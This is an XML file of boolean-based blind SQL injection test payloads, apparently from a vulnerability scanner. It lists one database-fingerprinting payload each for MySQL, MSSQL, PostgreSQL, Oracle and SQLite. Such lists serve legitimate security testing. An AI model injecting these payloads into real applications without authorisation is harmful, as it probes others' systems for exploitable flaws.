<?xml version="1.0" encoding="UTF-8"?>
<root>
    <test>
        <title>MySQL Boolean-Based Blind</title>
        <stype>1</stype>
        <dbms>MySQL</dbms>
        <payload>AND CONNECTION_ID()=CONNECTION_ID()</payload>
    </test>

    <test>
        <title>MSSQL Boolean-Based Blind</title>
        <stype>1</stype>
        <dbms>MSSQL</dbms>
        <payload>AND @@PACK_RECEIVED=@@PACK_RECEIVED</payload>
    </test>

    <test>
        <title>PostgreSQL Boolean-Based Blind</title>
        <stype>1</stype>
        <dbms>PostgreSQL</dbms>
        <payload>AND CURRENT_DATABASE()=CURRENT_DATABASE()</payload>
    </test>

    <test>
        <title>Oracle Boolean-Based Blind</title>
        <stype>1</stype>
        <dbms>Oracle</dbms>
        <payload>AND USER=USER</payload>
    </test>

    <test>
        <title>SQLite Boolean-Based Blind</title>
        <stype>1</stype>
        <dbms>SQLite</dbms>
        <payload>AND sqlite_version()=sqlite_version()</payload>
    </test>
</root>